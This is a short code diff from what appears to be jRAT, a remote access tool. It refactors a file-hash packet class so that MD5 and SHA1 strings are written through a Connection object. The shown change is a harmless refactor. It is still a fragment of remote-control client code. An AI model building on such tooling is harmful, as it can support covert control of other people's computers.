@@ -1,8 +1,7 @@
 package jrat.module.fs.packets;
 
+import jrat.client.Connection;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
 
 
 public class Packet46FileHash extends AbstractOutgoingPacket {
@@ -16,9 +15,9 @@ public class Packet46FileHash extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(md5);
-		sw.writeLine(sha1);
+	public void write(Connection con) throws Exception {
+        con.writeLine(md5);
+        con.writeLine(sha1);
 	}
 
 	@Override
